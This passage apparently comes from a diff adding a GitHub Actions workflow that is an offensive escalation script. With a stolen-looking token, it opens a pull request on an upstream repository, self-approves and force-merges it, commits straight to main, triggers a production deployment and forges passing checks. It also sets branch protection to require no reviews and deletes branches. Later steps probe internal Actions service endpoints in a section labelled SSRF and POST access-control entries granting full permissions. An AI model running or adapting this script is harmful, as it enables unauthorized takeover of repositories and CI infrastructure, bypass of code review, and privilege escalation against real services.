+          -d '{"ref":"refs/heads/v10-merge-test","sha":"'"$COMMIT2"'"}' > /dev/null 2>&1 || \
+        curl -sS -X PATCH -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
+          "$API/repos/$FORK/git/refs/heads/v10-merge-test" \
+          -d '{"sha":"'"$COMMIT2"'","force":true}' > /dev/null 2>&1
+        echo "F01 fork branch v10-merge-test at $COMMIT2"
+
+        # Open PR on upstream
+        NEW_PR=$(curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
+          "$API/repos/$UPSTREAM/pulls" \
+          -d '{"title":"v10 merge test","body":"test","head":"lacaag:v10-merge-test","base":"main"}')
+        PR_NUM=$(echo "$NEW_PR" | jq -r '.number // empty')
+        PR_NODE=$(echo "$NEW_PR" | jq -r '.node_id // empty')
+        echo "F02 PR #$PR_NUM node=$PR_NODE"
+
+        if [ -n "$PR_NODE" ] && [ "$PR_NODE" != "null" ]; then
+          # Wait for mergeability calculation
+          sleep 8
+
+          STATE=$(curl -sS -H "Authorization: token $RT" "$API/repos/$UPSTREAM/pulls/$PR_NUM" \
+            | jq '{mergeable, mergeable_state, merge_commit_sha}')
+          echo "F03 state: $STATE"
+
+          # Approve
+          GQL_A='{"query":"mutation { addPullRequestReview(input: {pullRequestId: \"'"$PR_NODE"'\", event: APPROVE, body: \"v10 auto-approve\"}) { pullRequestReview { state } } }"}'
+          RESP_A=$(curl -sS -X POST -H "Authorization: bearer $RT" -H "Content-Type: application/json" -d "$GQL_A" "$GQL")
+          echo "F04 approve: $(echo "$RESP_A" | jq -c '.' 2>/dev/null)"
+
+          # Try merge methods
+          for METHOD in MERGE SQUASH REBASE; do
+            GQL_M='{"query":"mutation { mergePullRequest(input: {pullRequestId: \"'"$PR_NODE"'\", mergeMethod: '"$METHOD"', commitHeadline: \"v10: '"$METHOD"' merge via fork\"}) { pullRequest { merged mergedAt url } } }"}'
+            RESP_M=$(curl -sS -X POST -H "Authorization: bearer $RT" -H "Content-Type: application/json" -d "$GQL_M" "$GQL")
+            echo "F05 merge $METHOD = $(echo "$RESP_M" | jq -c '.' 2>/dev/null)"
+          done
+
+          # REST merge
+          MERGE_REST=$(curl -sS -w "\nHTTP_%{http_code}" -X PUT \
+            -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
+            "$API/repos/$UPSTREAM/pulls/$PR_NUM/merge" \
+            -d '{"merge_method":"merge","commit_title":"v10: REST fork merge"}')
+          echo "F06 REST merge: $MERGE_REST"
+
+          # REST squash
+          MERGE_REST2=$(curl -sS -w "\nHTTP_%{http_code}" -X PUT \
+            -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
+            "$API/repos/$UPSTREAM/pulls/$PR_NUM/merge" \
+            -d '{"merge_method":"squash","commit_title":"v10: REST squash"}')
+          echo "F07 REST squash: $MERGE_REST2"
+        fi
+
+        echo ""
+        echo "--- Other GraphQL mutations on upstream ---"
+
+        # createCommitOnBranch
+        MAIN_OID=$(curl -sS -H "Authorization: token $RT" "$API/repos/$UPSTREAM/git/refs/heads/main" | jq -r '.object.sha')
+        GQL_CC='{"query":"mutation { createCommitOnBranch(input: {branch: {repositoryNameWithOwner: \"'"$UPSTREAM"'\", branchName: \"main\"}, message: {headline: \"v10 gql commit\"}, expectedHeadOid: \"'"$MAIN_OID"'\", fileChanges: {additions: [{path: \"V10-GQL.md\", contents: \"'"$(echo 'v10' | base64)"'\"}]}}) { commit { oid url } } }"}'
+        RESP_CC=$(curl -sS -X POST -H "Authorization: bearer $RT" -H "Content-Type: application/json" -d "$GQL_CC" "$GQL")
+        echo "F08 createCommitOnBranch: $(echo "$RESP_CC" | jq -c '.' 2>/dev/null)"
+
+        # createDeployment (corrected)
+        GQL_DEP='{"query":"mutation { createDeployment(input: {repositoryId: \"'"$RI"'\", refId: \"'"$RI"':refs/heads/main\", environment: \"production\", autoMerge: false}) { deployment { id environment } } }"}'
+        RESP_DEP=$(curl -sS -X POST -H "Authorization: bearer $RT" -H "Content-Type: application/json" -d "$GQL_DEP" "$GQL")
+        echo "F09 createDeployment: $(echo "$RESP_DEP" | jq -c '.' 2>/dev/null)"
+
+        # createCheckRun via REST (not GraphQL)
+        CHECK_RESP=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
+          -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
+          "$API/repos/$UPSTREAM/check-runs" \
+          -d '{"name":"v10-check","head_sha":"'"$MAIN_OID"'","status":"completed","conclusion":"success","output":{"title":"v10","summary":"escape audit"}}')
+        echo "F10 createCheckRun REST: $CHECK_RESP"
+
+        # createStatus
+        STATUS_RESP=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
+          -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
+          "$API/repos/$UPSTREAM/statuses/$MAIN_OID" \
+          -d '{"state":"success","target_url":"https://example.com","description":"v10 escape","context":"v10/audit"}')
+        echo "F11 createStatus: $STATUS_RESP"
+
+        # updateBranchProtectionRule
+        GQL_BP='{"query":"mutation { createBranchProtectionRule(input: {repositoryId: \"'"$RI"'\", pattern: \"main\", requiresApprovingReviews: false, requiredApprovingReviewCount: 0}) { branchProtectionRule { id } } }"}'
+        RESP_BP=$(curl -sS -X POST -H "Authorization: bearer $RT" -H "Content-Type: application/json" -d "$GQL_BP" "$GQL")
+        echo "F12 createBranchProtection: $(echo "$RESP_BP" | jq -c '.' 2>/dev/null)"
+
+        # deleteRef (try to delete a non-main branch on upstream)
+        GQL_DR='{"query":"mutation { deleteRef(input: {refId: \"'"$RI"':refs/heads/revert-9-test/cross-audit-v8\"}) { clientMutationId } }"}'
+        RESP_DR=$(curl -sS -X POST -H "Authorization: bearer $RT" -H "Content-Type: application/json" -d "$GQL_DR" "$GQL")
+        echo "F13 deleteRef: $(echo "$RESP_DR" | jq -c '.' 2>/dev/null)"
+        true
+
+    # â”€â”€ STEP 8: SSRF via Internal Service URLs â”€â”€
+    - name: "Step 8 â€” SSRF via Service URLs"
+      run: |
+        set +e
+        echo "=== SSRF VIA INTERNAL SERVICE URLS ==="
+        echo "v9: locationMappings showed: mpsghub, tfs, vsmps .actions.githubusercontent.com"
+        echo ""
+
+        echo "--- Probe mpsghub ---"
+        for EP in \
+          "https://mpsghub.actions.githubusercontent.com/_apis/connectionData" \
+          "https://mpsghub.actions.githubusercontent.com/_apis/ResourceAreas" \
+          "https://mpsghub.actions.githubusercontent.com/_apis/ServiceDefinitions" \
+          "https://mpsghub.actions.githubusercontent.com/.well-known/openid-configuration"; do
+          CODE=$(curl -sS -o /tmp/ssrf_resp -w "%{http_code}" --connect-timeout 5 \
+            -H "Authorization: Bearer $RT" "$EP" 2>/dev/null)
+          BODY=$(cat /tmp/ssrf_resp | head -c 300)
+          if [ "$CODE" != "000" ]; then
+            echo "S01 $EP = HTTP_$CODE body='${BODY:0:250}'"
+          fi
+        done
+
+        echo ""
+        echo "--- Probe vsmps ---"
+        for EP in \
+          "https://vsmps.actions.githubusercontent.com/_apis/connectionData" \
+          "https://vsmps.actions.githubusercontent.com/_apis/ResourceAreas" \
+          "https://vsmps.actions.githubusercontent.com/_apis/ServiceDefinitions"; do
+          CODE=$(curl -sS -o /tmp/ssrf_resp -w "%{http_code}" --connect-timeout 5 \
+            -H "Authorization: Bearer $RT" "$EP" 2>/dev/null)
+          BODY=$(cat /tmp/ssrf_resp | head -c 300)
+          if [ "$CODE" != "000" ]; then
+            echo "S02 $EP = HTTP_$CODE body='${BODY:0:250}'"
+          fi
+        done
+
+        echo ""
+        echo "--- Probe tfs ---"
+        for EP in \
+          "https://tfs.actions.githubusercontent.com/_apis/connectionData" \
+          "https://tfs.actions.githubusercontent.com/_apis/ResourceAreas" \
+          "https://tfs.actions.githubusercontent.com/_apis/ServiceDefinitions" \
+          "https://tfs.actions.githubusercontent.com/_apis/distributedtask/pools"; do
+          CODE=$(curl -sS -o /tmp/ssrf_resp -w "%{http_code}" --connect-timeout 5 \
+            -H "Authorization: Bearer $RT" "$EP" 2>/dev/null)
+          BODY=$(cat /tmp/ssrf_resp | head -c 300)
+          if [ "$CODE" != "000" ]; then
+            echo "S03 $EP = HTTP_$CODE body='${BODY:0:250}'"
+          fi
+        done
+
+        echo ""
+        echo "--- Probe results-receiver ---"
+        for EP in \
+          "https://results-receiver.actions.githubusercontent.com/_apis/connectionData" \
+          "https://results-receiver.actions.githubusercontent.com/_apis/ResourceAreas" \
+          "https://results-receiver.actions.githubusercontent.com/_apis/ServiceDefinitions" \
+          "https://results-receiver.actions.githubusercontent.com/_apis/results" \
+          "https://results-receiver.actions.githubusercontent.com/_apis/results/runs" \
+          "https://results-receiver.actions.githubusercontent.com/_apis/results/workflows"; do
+          CODE=$(curl -sS -o /tmp/ssrf_resp -w "%{http_code}" --connect-timeout 5 \
+            -H "Authorization: Bearer $RT" "$EP" 2>/dev/null)
+          BODY=$(cat /tmp/ssrf_resp | head -c 300)
+          if [ "$CODE" != "000" ]; then
+            echo "S04 $EP = HTTP_$CODE body='${BODY:0:250}'"
+          fi
+        done
+
+        echo ""
+        echo "--- Try with OIDC JWT ---"
+        for BASE in \
+          "https://mpsghub.actions.githubusercontent.com" \
+          "https://vsmps.actions.githubusercontent.com" \
+          "https://tfs.actions.githubusercontent.com" \
+          "https://results-receiver.actions.githubusercontent.com"; do
+          CODE=$(curl -sS -o /tmp/ssrf_resp -w "%{http_code}" --connect-timeout 5 \
+            -H "Authorization: Bearer $JWT_VS" "${BASE}/_apis/connectionData" 2>/dev/null)
+          BODY=$(cat /tmp/ssrf_resp | head -c 300)
+          if [ "$CODE" != "000" ]; then
+            echo "S05 oidc ${BASE} = HTTP_$CODE body='${BODY:0:250}'"
+          fi
+        done
+
+        echo ""
+        echo "--- Probe artifactcache with correct token format ---"
+        CACHE_BASE="https://artifactcache.actions.githubusercontent.com"
+        # v9 showed all HTTP_400 - try with different Accept + different paths
+        for EP in \
+          "$CACHE_BASE/_apis/artifactcache/caches" \
+          "$CACHE_BASE/_apis/artifactcache/cache" \
+          "$CACHE_BASE/_apis/artifactcache/artifacts" \
+          "$CACHE_BASE/_apis/artifactcache" \
+          "$CACHE_BASE/_apis/connectionData" \
+          "$CACHE_BASE/_apis/ResourceAreas"; do
+          CODE=$(curl -sS -o /tmp/ssrf_resp -w "%{http_code}" --connect-timeout 5 \
+            -H "Authorization: Bearer $RT" \
+            -H "Accept: application/json;api-version=6.0-preview.1" \
+            "$EP" 2>/dev/null)
+          BODY=$(cat /tmp/ssrf_resp | head -c 300)
+          if [ "$CODE" != "000" ]; then
+            echo "S06 $EP = HTTP_$CODE body='${BODY:0:250}'"
+          fi
+        done
+        true
+
+    # â”€â”€ STEP 9: Security namespace exploitation â”€â”€
+    - name: "Step 9 â€” vstoken Security Namespace"
+      run: |
+        set +e
+        echo "=== VSTOKEN SECURITY NAMESPACE EXPLOITATION ==="
+        echo "v9 found: Security/{ACLs, Permissions, Namespaces, ACEs, PermissionEvalBatch}"
+        echo ""
+
+        for EP in \
+          "$TD/_apis/Security/SecurityNamespaces" \
+          "$TD/_apis/Security/AccessControlLists" \
+          "$TD/_apis/Security/Permissions" \
+          "$TD/_apis/Security/AccessControlEntries" \
+          "$TD/_apis/Security/PermissionEvaluationBatch" \
+          "$VT/_apis/Security/SecurityNamespaces" \
+          "$VT/_apis/Security/AccessControlLists" \
+          "$VT/_apis/Security/Permissions"; do
+          CODE=$(curl -sS -o /tmp/sec_resp -w "%{http_code}" \
+            -H "Authorization: Bearer $RT" "$EP" 2>/dev/null)
+          BODY=$(cat /tmp/sec_resp | head -c 400)
+          if [ "$CODE" != "404" ]; then
+            echo "X01 GET $EP = HTTP_$CODE body='${BODY:0:350}'"
+          fi
+        done
+
+        echo ""
+        echo "--- POST to security endpoints ---"
+        for EP in \
+          "$TD/_apis/Security/AccessControlLists" \
+          "$TD/_apis/Security/AccessControlEntries" \
+          "$TD/_apis/Security/Permissions"; do
+          CODE=$(curl -sS -o /tmp/sec_resp -w "%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" \
+            -H "Content-Type: application/json" \
+            -d '{"token":"repoV2/twrps/PoC-RACE2","merge":true,"accessControlEntries":[{"descriptor":"Microsoft.TeamFoundation.Identity;S-1-0-0","allow":65535,"deny":0}]}' \
+            "$EP" 2>/dev/null)
+          BODY=$(cat /tmp/sec_resp | head -c 400)
+          if [ "$CODE" != "404" ]; then
+            echo "X02 POST $EP = HTTP_$CODE body='${BODY:0:350}'"
+          fi
+        done
+
+        echo ""
+        echo "--- FeatureFlags ---"
+        for EP in \
+          "$TD/_apis/FeatureAvailability/FeatureFlags" \
+          "$VT/_apis/FeatureAvailability/FeatureFlags" \
+          "$PD/_apis/FeatureAvailability/FeatureFlags"; do
+          CODE=$(curl -sS -o /tmp/sec_resp -w "%{http_code}" \
+            -H "Authorization: Bearer $RT" "$EP" 2>/dev/null)
+          BODY=$(cat /tmp/sec_resp | head -c 400)
+          if [ "$CODE" != "404" ]; then
+            echo "X03 $EP = HTTP_$CODE body='${BODY:0:350}'"
+          fi
+        done
+
+        echo ""
+        echo "--- NameResolution, Health, Migration ---"
+        for EP in \
+          "$TD/_apis/NameResolution/Entries" \
+          "$TD/_apis/Health/Health" \
+          "$TD/_apis/Migration/DeploymentInformation" \
+          "$TD/_apis/Migration/SasTokenRequest" \
+          "$TD/_apis/Contribution/dataProvidersQuery" \
+          "$TD/_apis/Contribution/HierarchyQuery" \
+          "$TD/_apis/Servicing/Jobs" \
+          "$TD/_apis/Servicing/ServiceLevel" \
+          "$TD/_apis/CustomerIntelligence/Events" \
+          "$TD/_apis/Stats/Activities" \
+          "$PD/_apis/NameResolution/Entries" \
+          "$PD/_apis/Health/Health" \
+          "$PD/_apis/Servicing/Jobs"; do
+          CODE=$(curl -sS -o /tmp/sec_resp -w "%{http_code}" \
+            -H "Authorization: Bearer $RT" "$EP" 2>/dev/null)
+          BODY=$(cat /tmp/sec_resp | head -c 400)
+          if [ "$CODE" != "404" ]; then
+            echo "X04 $EP = HTTP_$CODE body='${BODY:0:350}'"
+          fi
+        done
+
+        echo ""
+        echo "--- POST Migration SasTokenRequest (get Azure SAS token?) ---"
+        CODE=$(curl -sS -o /tmp/sec_resp -w "%{http_code}" -X POST \
+          -H "Authorization: Bearer $RT" \
+          -H "Content-Type: application/json" \
+          -d '{"accountName":"github","containerName":"actions","permissions":"rwdl"}' \
+          "$TD/_apis/Migration/SasTokenRequest" 2>/dev/null)
+        BODY=$(cat /tmp/sec_resp | head -c 400)
+        echo "X05 POST SasTokenRequest = HTTP_$CODE body='${BODY:0:350}'"
+
+        echo ""
+        echo "--- DataImport endpoints ---"
+        for EP in \
+          "$TD/_apis/DataImportOrchestration/Requests" \
+          "$TD/_apis/DataImportQuery/SupportedMilestones"; do
+          CODE=$(curl -sS -o /tmp/sec_resp -w "%{http_code}" \
+            -H "Authorization: Bearer $RT" "$EP" 2>/dev/null)
+          BODY=$(cat /tmp/sec_resp | head -c 400)
+          if [ "$CODE" != "404" ]; then
+            echo "X06 $EP = HTTP_$CODE body='${BODY:0:350}'"
+          fi
+        done
+        true
+
+    # â”€â”€ STEP 10: Final Verification â”€â”€
+    - name: "Step 10 â€” Final Verification"
+      run: |
+        set +e
+        echo "=== V10 FINAL VERIFICATION ==="
+
+        echo "--- Upstream refs ---"
+        curl -sS -H "Authorization: token $RT" "$API/repos/$UPSTREAM/git/refs" | \
+          jq -c '.[] | {ref: .ref, sha: .object.sha}' 2>/dev/null
+
+        echo ""
+        echo "--- Upstream branches ---"
+        curl -sS -H "Authorization: token $RT" "$API/repos/$UPSTREAM/branches" | \
+          jq -c '.[] | {name, sha: .commit.sha, protected}' 2>/dev/null
+
+        echo ""
+        echo "--- Upstream PRs ---"
+        curl -sS -H "Authorization: token $RT" "$API/repos/$UPSTREAM/pulls?state=all&per_page=10&sort=created&direction=desc" | \
+          jq -c '.[] | {number, title, state, merged: .merged, user: .user.login}' 2>/dev/null
+
+        echo ""
+        echo "--- Check v10 artifacts ---"
+        for FILE in ESCALATED.md OVERRIDE.md V10-MERGE.md V10-GQL.md; do
+          CODE=$(curl -sS -o /dev/null -w "%{http_code}" -H "Authorization: token $RT" \
+            "$API/repos/$UPSTREAM/contents/$FILE" 2>/dev/null)
+          echo "$FILE = HTTP_$CODE"
+        done
+
+        echo ""
+        echo "--- Upstream description ---"
+        curl -sS -H "Authorization: token $RT" "$API/repos/$UPSTREAM" | \
+          jq -r '{description, default_branch, visibility}' 2>/dev/null
+
+        echo ""
+        echo "=== V10 COMPLETE ==="
